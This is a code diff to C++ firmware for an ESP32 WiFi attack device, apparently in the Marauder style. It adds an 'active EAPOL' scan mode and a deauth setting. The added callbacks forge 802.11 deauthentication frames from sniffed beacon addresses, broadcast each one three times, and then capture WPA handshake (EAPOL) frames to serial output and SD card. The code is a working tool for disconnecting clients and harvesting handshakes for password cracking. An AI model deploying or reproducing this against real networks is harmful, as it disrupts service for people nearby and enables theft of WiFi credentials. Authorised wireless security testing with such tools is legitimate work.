@@ -277,6 +277,8 @@ void WiFiScan::StartScan(uint8_t scan_mode, uint16_t color)
     RunProbeScan(scan_mode, color);
   else if (scan_mode == WIFI_SCAN_EAPOL)
     RunEapolScan(scan_mode, color);
+  else if (scan_mode == WIFI_SCAN_ACTIVE_EAPOL)
+    RunEapolScan(scan_mode, color);
   else if (scan_mode == WIFI_SCAN_AP)
     RunBeaconScan(scan_mode, color);
   else if (scan_mode == WIFI_SCAN_TARGET_AP)
@@ -845,7 +847,10 @@ void WiFiScan::RunEapolScan(uint8_t scan_mode, uint16_t color)
   esp_wifi_start();
   esp_wifi_set_promiscuous(true);
   esp_wifi_set_promiscuous_filter(&filt);
-  esp_wifi_set_promiscuous_rx_cb(&eapolSnifferCallback);
+  if (scan_mode == WIFI_SCAN_ACTIVE_EAPOL)
+    esp_wifi_set_promiscuous_rx_cb(&activeEapolSnifferCallback);
+  else
+    esp_wifi_set_promiscuous_rx_cb(&eapolSnifferCallback);
   esp_wifi_set_channel(set_channel, WIFI_SECOND_CHAN_NONE);
   this->wifi_initialized = true;
   initTime = millis();
@@ -2234,6 +2239,7 @@ void WiFiScan::wifiSnifferCallback(void* buf, wifi_promiscuous_pkt_type_t type)
 void WiFiScan::eapolSnifferCallback(void* buf, wifi_promiscuous_pkt_type_t type)
 {
   bool save_packet = settings_obj.loadSetting<bool>(text_table4[7]);
+  bool send_deauth = settings_obj.loadSetting<bool>(text_table4[5]);
   
   wifi_promiscuous_pkt_t *snifferPacket = (wifi_promiscuous_pkt_t*)buf;
   WifiMgmtHdr *frameControl = (WifiMgmtHdr*)snifferPacket->payload;
@@ -2249,6 +2255,83 @@ void WiFiScan::eapolSnifferCallback(void* buf, wifi_promiscuous_pkt_type_t type)
   }
 
   // Found beacon frame. Decide whether to deauth
+  if (send_deauth) {
+    if (snifferPacket->payload[0] == 0x80) {    
+      // Build packet
+  
+      uint8_t new_packet[26] = {
+                                0xc0, 0x00, 0x3a, 0x01,
+                                0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
+                                0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+                                0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+                                0xf0, 0xff, 0x02, 0x00
+                            };
+      
+      new_packet[10] = snifferPacket->payload[10];
+      new_packet[11] = snifferPacket->payload[11];
+      new_packet[12] = snifferPacket->payload[12];
+      new_packet[13] = snifferPacket->payload[13];
+      new_packet[14] = snifferPacket->payload[14];
+      new_packet[15] = snifferPacket->payload[15];
+    
+      new_packet[16] = snifferPacket->payload[10];
+      new_packet[17] = snifferPacket->payload[11];
+      new_packet[18] = snifferPacket->payload[12];
+      new_packet[19] = snifferPacket->payload[13];
+      new_packet[20] = snifferPacket->payload[14];
+      new_packet[21] = snifferPacket->payload[15];      
+    
+      // Send packet
+      esp_wifi_80211_tx(WIFI_IF_AP, new_packet, sizeof(new_packet), false);
+      esp_wifi_80211_tx(WIFI_IF_AP, new_packet, sizeof(new_packet), false);
+      esp_wifi_80211_tx(WIFI_IF_AP, new_packet, sizeof(new_packet), false);
+    }
+
+
+  }
+
+  if (( (snifferPacket->payload[30] == 0x88 && snifferPacket->payload[31] == 0x8e)|| ( snifferPacket->payload[32] == 0x88 && snifferPacket->payload[33] == 0x8e) )){
+    num_eapol++;
+    Serial.println("Received EAPOL:");
+
+    for (int i = 0; i < len; i++) {
+      char hexCar[4];
+      sprintf(hexCar, "%02X", snifferPacket->payload[i]);
+      Serial.print(hexCar);
+      //Serial.print(snifferPacket->payload[i], HEX);
+      if ((i + 1) % 16 == 0)
+        Serial.print("\n");
+      else
+        Serial.print(" ");
+    }
+  
+    Serial.print("\n");
+  }
+
+  if (save_packet)
+    sd_obj.addPacket(snifferPacket->payload, len);
+}
+
+void WiFiScan::activeEapolSnifferCallback(void* buf, wifi_promiscuous_pkt_type_t type)
+{
+  bool save_packet = settings_obj.loadSetting<bool>(text_table4[7]);
+  bool send_deauth = settings_obj.loadSetting<bool>(text_table4[5]);
+  
+  wifi_promiscuous_pkt_t *snifferPacket = (wifi_promiscuous_pkt_t*)buf;
+  WifiMgmtHdr *frameControl = (WifiMgmtHdr*)snifferPacket->payload;
+  wifi_pkt_rx_ctrl_t ctrl = (wifi_pkt_rx_ctrl_t)snifferPacket->rx_ctrl;
+  int len = snifferPacket->rx_ctrl.sig_len;
+
+  if (type == WIFI_PKT_MGMT)
+  {
+    len -= 4;
+    int fctl = ntohs(frameControl->fctl);
+    const wifi_ieee80211_packet_t *ipkt = (wifi_ieee80211_packet_t *)snifferPacket->payload;
+    const WifiMgmtHdr *hdr = &ipkt->hdr;
+  }
+
+  // Found beacon frame. Decide whether to deauth
+
   if (snifferPacket->payload[0] == 0x80) {    
     // Build packet
 
@@ -2259,10 +2342,6 @@ void WiFiScan::eapolSnifferCallback(void* buf, wifi_promiscuous_pkt_type_t type)
                               0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                               0xf0, 0xff, 0x02, 0x00
                           };
-
-    //esp_wifi_set_mode(WIFI_AP_STA);
-
-    //delay(1);
     
     new_packet[10] = snifferPacket->payload[10];
     new_packet[11] = snifferPacket->payload[11];
@@ -2282,10 +2361,9 @@ void WiFiScan::eapolSnifferCallback(void* buf, wifi_promiscuous_pkt_type_t type)
     esp_wifi_80211_tx(WIFI_IF_AP, new_packet, sizeof(new_packet), false);
     esp_wifi_80211_tx(WIFI_IF_AP, new_packet, sizeof(new_packet), false);
     esp_wifi_80211_tx(WIFI_IF_AP, new_packet, sizeof(new_packet), false);
-
-    //delay(1);
-    //esp_wifi_set_mode(WIFI_MODE_NULL);
   }
+
+
 
   if (( (snifferPacket->payload[30] == 0x88 && snifferPacket->payload[31] == 0x8e)|| ( snifferPacket->payload[32] == 0x88 && snifferPacket->payload[33] == 0x8e) )){
     num_eapol++;
@@ -2767,6 +2845,12 @@ void WiFiScan::main(uint32_t currentTime)
     #endif
   }
   else if (currentScanMode == WIFI_SCAN_EAPOL)
+  {
+    #ifdef HAS_SCREEN
+      eapolMonitorMain(currentTime);
+    #endif
+  }
+  else if (currentScanMode == WIFI_SCAN_ACTIVE_EAPOL)
   {
     #ifdef HAS_SCREEN
       eapolMonitorMain(currentTime);
